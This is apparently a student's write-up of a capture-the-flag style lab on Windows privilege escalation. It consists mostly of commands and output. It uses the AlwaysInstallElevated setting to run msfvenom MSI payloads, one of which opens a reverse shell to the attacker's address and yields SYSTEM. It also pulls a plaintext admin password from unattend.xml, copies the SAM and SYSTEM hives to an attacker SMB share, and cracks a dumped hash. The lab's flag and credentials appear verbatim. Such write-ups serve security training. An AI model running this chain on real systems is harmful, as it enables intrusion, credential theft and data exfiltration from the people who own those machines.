As an add-on to their annual penetration test, the INLANEFREIGHT organization has asked you to perform a security review of their standard Windows 10 gold image build currently in use by over 1,200 of their employees worldwide. The new CISO is worried that best practices were not followed when establishing the image baseline, and there may be one or more local privilege escalation vectors present in the build. Above all, the CISO wants to protect the company's internal infrastructure by ensuring that an attacker who can gain access to a workstation (through a phishing attack, for example) would be unable to escalate privileges and use that access move laterally through the network. Due to regulatory requirements, INLANEFREIGHT employees do not have local administrator privileges on their workstations.

You have been granted a standard user account with RDP access to a clone of a standard user Windows 10 workstation with no internet access. The client wants as comprehensive an assessment as possible (they will likely hire your firm to test/attempt to bypass EDR controls in the future); therefore, Defender has been disabled. Due to regulatory controls, they cannot allow internet access to the host, so you will need to transfer any tools over yourself.

Enumerate the host fully and attempt to escalate privileges to administrator/SYSTEM level access.

---
$wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe
$python3 -m http.server
PS C:\> curl http://10.10.14.188:8000/LaZagne.exe -outfile "C:\Users\htb-student\Desktop\laz.exe"

C:\Users\htb-student\Desktop>where /r C:\Windows\Microsoft.NET\Framework64 csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

**Sharp Collection:** https://github.com/Flangvik/SharpCollection
Downloaded directly from https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpChrome.exe
PS C:\> curl http://10.10.14.188:8000/SharpChrome.exe -outfile "C:\Users\htb-student\Desktop\SharpChrome.exe"

$wget https://github.com/Arvanaghi/SessionGopher/blob/master/SessionGopher.ps1
PS C:\>curl http://10.10.14.188:8000/SessionGopher.ps1 -outfile "C:\Users\htb-student\Desktop\SG.ps1"

PS C:\> findstr /SIM /C:"iamtheadministrator" *.txt *.ini *.cfg *.config *.xml                                          Users\htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Windows\Panther\unattend.xml

<SNIP>
<AutoLogon>
<Password>
<Value>Inl@n3fr3ight_sup3rAdm1n!</Value>
<PlainText>true</PlainText>
</Password>
<Enabled>false</Enabled>
<Username>INLANEFREIGHT\iamtheadministrator</Username>
</AutoLogon>
<OOBE>
<SNIP>

https://github.com/Flangvik/SharpCollection/raw/refs/heads/master/NetFramework_4.7_Any/SharpUp.exe

PS C:>curl http://10.10.14.188:8000/SharpUp.exe -outfile "C:\Users\htb-student\Desktop\SharpUp.exe"

PS C:\Users\htb-student\Desktop> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.

=== Always Install Elevated ===
        HKCU: 1
        HKLM: 1


=== Unattended Install Files ===
        C:\Windows\Panther\Unattend.xml



[*] Completed Privesc Checks in 8 seconds

Since AlwaysInstallElevated is enabled, Windows will ignore the current user's restrictions and use the highest system authority to perform an installation. You can exploit this by creating a malicious .msi file that executes a command (like a reverse shell or adding an admin user) when "installed".

$msfvenom -p windows/x64/exec CMD="net localgroup administrators htb-student /add" -f msi -o setup.msi

PS C:>curl "http://10.10.14.188:8000/setup.msi" -OutFile "$home\Desktop\setup.msi"

PS C:>msiexec /quiet /qn /i setup.msi

Open admin powershell

PS C:>whoami /priv

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled


$msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.188 LPORT=4444 -f msi -o update.msi

$nc -lvnp 4444

# Transfer the file
PS C:/>iwr -Uri "http://10.10.14.188:8000/update.msi" -OutFile "$home\Desktop\update.msi"

# Run it as SYSTEM
PS C:/>msiexec /quiet /qn /i update.msi

└──╼ [★]$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.188] from (UNKNOWN) [10.129.43.33] 49676
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
el3vatEd_1nstall$_v3ry_r1sky

PS C:\> reg save HKLM\SAM C:\Users\Public\sam.save
PS C:\>reg save HKLM\SYSTEM C:\Users\Public\system.save
 $sudo impacket-smbserver share /tmp -smb2support
PS C:\>Copy-Item -Path "C:\Users\Public\system.hiv" -Destination "\\10.10.14.188\share\SYSTEM"
PS C:\>Copy-Item -Path "C:\Users\Public\sam.hiv" -Destination "\\10.10.14.188\share\SAM"
$ sudo mv /tmp/SAM ~
$ sudo mv /tmp/SYSTEM ~
$ cd ~
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xfab4b2e32a415ea36f846b9408aa69af
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
[*] Cleaning up... 

$tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
$ echo '5835048ce94ad0564e29a924a03510ef' > hash.txt
$ hashcat -m 1000 hash.txt rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

5835048ce94ad0564e29a924a03510ef:password1  